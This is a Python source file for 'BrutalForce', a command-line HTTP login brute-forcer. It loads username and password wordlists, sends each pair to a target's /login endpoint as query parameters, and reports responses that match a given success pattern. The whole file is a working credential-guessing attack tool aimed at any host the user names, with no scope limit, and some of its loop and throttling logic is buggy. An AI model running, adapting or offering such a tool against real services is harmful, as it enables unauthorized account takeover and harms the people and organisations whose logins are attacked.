import http.client
import sys
import time
import re
from pathlib import Path
from colorama import init, Fore

# BrutalForce author: Zombrax

brutal_force_ascii = r"""
 /$$$$$$$                        /$$               /$$       /$$$$$$$$                                     
| $$__  $$                      | $$              | $$      | $$_____/                                     
| $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$ | $$      | $$     /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$ 
| $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   |____  $$| $$      | $$$$$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$
| $$__  $$| $$  \__/| $$  | $$  | $$      /$$$$$$$| $$      | $$__/| $$  \ $$| $$  \__/| $$      | $$$$$$$$
| $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$__  $$| $$      | $$   | $$  | $$| $$      | $$      | $$_____/
| $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$| $$      | $$   |  $$$$$$/| $$      |  $$$$$$$|  $$$$$$$
|_______/ |__/       \______/    \___/   \_______/|__/      |__/    \______/ |__/       \_______/ \_______/
"""

# Initialize colorama
init()

def print_help():
    print(f"\n{Fore.GREEN}[+] {Fore.RESET} Usage: python script.py {Fore.GREEN}<target_host> <target_port> <usernames_file> <passwords_file> <requests_per_second> <connections_per_request> <connections_per_second> <word_or_regex_pattern> -A <API>\n")
    print(f"{Fore.GREEN}[+] {Fore.RESET} Arguments usage:")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<target_host>            {Fore.YELLOW}Target host IP or domain.")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<target_port>            {Fore.YELLOW}Target host port.")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<usernames_file>         {Fore.YELLOW}Usernames wordlist (one per line).")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<passwords_file>         {Fore.YELLOW}Passwords wordlist (one per line).")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<requests_per_second>    {Fore.YELLOW}Number of requests per second.")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<connections_per_request> {Fore.YELLOW}Number of connections per request.")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<connections_per_second> {Fore.YELLOW}Maximum connections sent per second.")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<word_or_regex_pattern> {Fore.YELLOW}Word or regex pattern to look for in response as a filter for success.")
    print(f"{Fore.GREEN}[+] {Fore.RESET} {Fore.RED}<-A> {Fore.YELLOW}API defining if exists.")
    sys.exit(0)

# Print banner in red and white colors
def print_banner():
    brutal_force_colored = brutal_force_ascii.replace("/", f"{Fore.RED}/").replace("_", f"{Fore.WHITE}_").replace("$", f"{Fore.WHITE}$")
    print(brutal_force_colored)

# Define the colorful ASCII progress bar
def print_progress_bar(current_step, total_steps):
    bar_width = 40
    progress = min(current_step / total_steps, 1.0)  # Ensure progress does not go above 100%
    completed_width = int(bar_width * progress) # Total width of the progress bar
    remaining_width = bar_width - completed_width # Remaining progress bar
    progress_bar = f"[{Fore.RED}{'=' * completed_width}{Fore.RESET}{Fore.WHITE}{'.' * remaining_width}{Fore.RESET}]"
    return f"{progress_bar} {int(progress * 100):<3}%" 

# Check for banner printing command
if (sys.argv[1] == "-b" or sys.argv[1] == "--banner"):
    print_banner()
    sys.exit(0)

# Check if the correct number of argument is passed to the script
if (len(sys.argv) < 8):
    print_help()

# Check for help printing command
if (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
    print_help()

print_banner()

# Get target host and port from command-line arguments
target_host = sys.argv[1]
target_port = int(sys.argv[2])
usernames_file = sys.argv[3]
passwords_file = sys.argv[4]
requests_per_second = int(sys.argv[5])
connections_per_request = int(sys.argv[6])
connections_per_second = int(sys.argv[7])


api_route = None
# Check if the host is accessible and if user has added an input for using API route
if "-A" in sys.argv:
    api_route_index = sys.argv.index("-A") + 1
    if api_route_index >= len(sys.argv):
        print("[-] Missing API route after -A argument.")
        sys.exit(1)
    api_route = sys.argv[api_route_index]
    
    try:
        conn = http.client.HTTPConnection(target_host, target_port)
        conn.request("GET", api_route)
        response = conn.getresponse()
        if response.status != 200:
            print("[-] Target host is not accessible [Might be blocked].")
            conn.close()
            sys.exit(1)
        conn.close()
    except Exception as e:
        print("[-] Error:", e)
        sys.exit(1)
else:
    try:
        conn = http.client.HTTPConnection(target_host, target_port)
        conn.request("GET", "/")
        response = conn.getresponse()
        if response.status != 200:
            print("[-] Target host is not accessible [Might be blocked].")
            conn.close()
            sys.exit(1)
        conn.close()
    except Exception as e:
        print("[-] Error:", e)
        sys.exit(1)

specific_pattern = None
if len(sys.argv) > 8:
    specific_pattern = sys.argv[8]

usernames_path = Path(usernames_file)
passwords_path = Path(passwords_file)

if not usernames_path.exists():
    print("[-] Usernames wordlist file does not exist.\n")
    sys.exit(1)

if not passwords_path.exists():
    print("[-] Passwords wordlist file does not exist.\n")
    sys.exit(1)

# Read usernames from the file
with open(usernames_file, "r") as file:
    usernames = [line.strip() for line in file.readlines()]

# Read passwords from the file
with open(passwords_file, "r") as file:
    passwords = [line.strip() for line in file.readlines()]

# Check if there are usernames or passwords present
send_empty_params = False
if len(usernames) == 0 or len(passwords) == 0:
    send_empty_params = True

# Iterate through the usernames and passwords and send requests
total_combinations = len(usernames) * len(passwords)
current_combination = 0

if send_empty_params == True:
    # Create multiple connections per request
    connections = []
    conn = http.client.HTTPConnection(target_host, target_port)
    connections.append(conn)
    for _ in range(connections_per_request):
        # Send requests using the connections
        connections_sent = 0
        for conn in connections:
            # Introduce delay between connections sent
            if connections_per_second > 0:
                if connections_sent >= connections_per_second:
                    time.sleep(1)  # Delay to manage connections per second
                    connections_sent = 0
                connections_sent += 1
                
            # Send the request based if API is provided or not and get the response
            if api_route:
                conn.request("GET", api_route)
            else:
                conn.request("GET", "/")

            response = conn.getresponse()
                
            # Process the response
            status = response.status
            data = response.read().decode("utf-8")

            # Update and print the progress bar
            current_combination += 1
            progress_bar = print_progress_bar(current_combination, connections_per_request)
            if specific_pattern:
                if re.findall(specific_pattern, data, re.IGNORECASE):
                    print(f"{Fore.GREEN}[+]{Fore.RESET} Found matching: {Fore.GREEN}{specific_pattern} {Fore.RESET}| {Fore.YELLOW}Status: {status} | {Fore.RESET} {progress_bar}")
                else:
                    print(f"{Fore.RED}[-]{Fore.RESET} No matching for {Fore.YELLOW}{specific_pattern} {Fore.RESET}|Status: {status} | {progress_bar}")
            else:
                    print(f"{Fore.RED}[+]{Fore.RESET} Trying: {Fore.RESET}|Pattern: {Fore.YELLOW}No pattern applied | Status: {Fore.YELLOW}{status} {Fore.RESET}| {progress_bar}")

                # print(f"[+] Response Status: {status}")
                # print(f"[+] Response Data: {data}")
            
            # Close the connections
            for conn in connections:
                conn.close()
        
        # Introduce delay between requests sent
        if (requests_per_second >= 0):
            time.sleep(requests_per_second)
else:
    for username in usernames:
        for password in passwords:
            # Create multiple connections per request
            connections = []
            conn = http.client.HTTPConnection(target_host, target_port)
            connections.append(conn)
            for _ in range(connections_per_request):
                # Send requests using the connections
                connections_sent = 0
            for conn in connections:
                # Introduce delay between connections sent
                if connections_per_second > 0:
                    if connections_sent >= connections_per_second:
                        time.sleep(1)  # Delay to manage connections per second
                        connections_sent = 0
                    connections_sent += 1
                
                # Send the request and get the response
                if send_empty_params:
                    if api_route:
                        conn.request("GET", api_route)
                    else:
                        conn.request("GET", "/")
                else:
                    conn.request("GET", f"/login?username={username}&password={password}")

                response = conn.getresponse()
                
                # Process the response
                status = response.status
                data = response.read().decode("utf-8")

                # Update and print the progress bar
                current_combination += 1
                progress_bar = print_progress_bar(current_combination, total_combinations * connections_per_request)
                if specific_pattern:
                    if re.findall(specific_pattern, data, re.IGNORECASE):
                        print(f"{Fore.GREEN}[+]{Fore.RESET} Found matching: {Fore.GREEN}{specific_pattern} {Fore.RESET}| {Fore.YELLOW}Status: {status} | {Fore.RESET}Username: {Fore.GREEN}{username} |{Fore.RESET}Password: {Fore.GREEN}{password} | {Fore.RESET} {progress_bar}")
                    else:
                        print(f"{Fore.RED}[-]{Fore.RESET} No matching for {Fore.YELLOW}{specific_pattern} {Fore.RESET}|Status: {status} | {progress_bar}")
                else:
                    print(f"{Fore.RED}[+]{Fore.RESET} Trying: {Fore.YELLOW}{username} {Fore.RESET}- {Fore.YELLOW}{password} {Fore.RESET}|Pattern: {Fore.YELLOW}No pattern applied | Status: {Fore.YELLOW}{status} {Fore.RESET}| {progress_bar}")

                # print(f"[+] Response Status: {status}")
                # print(f"[+] Response Data: {data}")
            
            # Close the connections
            for conn in connections:
                conn.close()
        
        # Introduce delay between requests sent
        if (requests_per_second >= 0):
            time.sleep(requests_per_second)

# Print details about the process
print(f"\n{Fore.GREEN}[+]{Fore.RESET} Requests sent: {Fore.GREEN}{current_combination}")
print(f"{Fore.GREEN}[+]{Fore.RESET} Done!")
print(f"\n{Fore.YELLOW}© Zombrax.")

# Close the connection
conn.close()